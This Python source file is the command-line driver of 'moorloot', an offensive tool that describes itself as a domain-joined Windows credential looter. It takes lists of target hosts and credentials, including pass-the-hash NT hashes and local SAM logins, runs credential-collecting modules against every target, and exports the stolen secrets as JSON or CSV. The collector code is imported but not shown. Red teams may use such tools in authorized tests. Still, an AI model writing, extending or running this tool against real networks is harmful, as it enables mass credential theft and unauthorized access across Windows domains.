#!/usr/bin/env python3
"""moorloot - domain-joined Windows credential looter (Phase 1 / MVP)."""
from __future__ import annotations

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.credential import CredentialPool, parse_credential          # noqa: E402
from core.runner import run_all                                        # noqa: E402
from core import reporter                                              # noqa: E402
from core.tools import tool_status                                     # noqa: E402
from collectors import ALL_COLLECTORS, registry                        # noqa: E402


def build_args() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="moorloot - unified Windows credential looter (MVP)",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-t", "--target", action="append", default=[],
                   help="target host/IP (repeatable)")
    p.add_argument("--target-file", help="file with one target per line")
    p.add_argument("--cred", action="append", default=[],
                   help="DOMAIN/user:pass or DOMAIN/user#nthash (repeatable)")
    p.add_argument("--cred-file", help="file with one credential per line")
    p.add_argument("-d", "--domain", default="", help="default domain")
    p.add_argument("--local-auth", action="store_true", help="treat creds as local (SAM)")
    p.add_argument("-o", "--out", default="moorloot_loot", help="output directory")
    p.add_argument("--json", action="store_true", help="export loot.json")
    p.add_argument("--csv", action="store_true", help="export loot.csv")
    p.add_argument("--only", help="comma list of collectors to run (see --list)")
    p.add_argument("--skip", help="comma list of collectors to skip")
    p.add_argument("--timeout", type=int, default=300, help="per-command timeout (s)")
    p.add_argument("--list", action="store_true", help="list collectors and exit")
    p.add_argument("-v", "--verbose", action="store_true")
    return p


def select_collectors(only: str, skip: str):
    chosen = list(ALL_COLLECTORS)
    if only:
        keys = {k.strip().lower() for k in only.split(",")}
        chosen = [c for c in chosen if c.name.lower().replace("/", "_") in keys]
    if skip:
        keys = {k.strip().lower() for k in skip.split(",")}
        chosen = [c for c in chosen if c.name.lower().replace("/", "_") not in keys]
    return chosen


def main() -> int:
    args = build_args().parse_args()
    reporter.print_banner()

    if args.list:
        print("Collectors (key -> description):")
        for c in ALL_COLLECTORS:
            key = c.name.lower().replace("/", "_")
            print(f"  {key:<12} {c.description}  [needs: {','.join(c.requires)}]")
        return 0

    ts = tool_status()
    print("[*] external tools:",
          ", ".join(f"{k}={'OK' if v else 'MISSING'}" for k, v in ts.items()),
          file=sys.stderr)

    targets = list(args.target)
    if args.target_file:
        with open(args.target_file) as fh:
            targets += [l.strip() for l in fh if l.strip() and not l.startswith("#")]
    if not targets:
        print("[!] no targets (use -t / --target-file)", file=sys.stderr)
        return 2

    pool = CredentialPool()
    for c in args.cred:
        pool.add(parse_credential(c, args.domain, args.local_auth))
    if args.cred_file:
        for c in CredentialPool.from_file(args.cred_file, args.domain, args.local_auth):
            pool.add(c)
    if not pool:
        print("[!] no credentials (use --cred / --cred-file)", file=sys.stderr)
        return 2
    print(f"[*] {len(pool)} credential(s), {len(targets)} target(s)", file=sys.stderr)

    collectors = select_collectors(args.only, args.skip)
    secrets = run_all(targets, pool, collectors, args.out,
                      timeout=args.timeout, verbose=args.verbose)

    print()
    reporter.render_table(secrets)
    if args.json or args.csv:
        reporter.export(secrets, args.out, args.json, args.csv)
        print(f"\n[*] exports written under {args.out}/", file=sys.stderr)
    print(f"[*] raw tool output under {args.out}/raw/", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
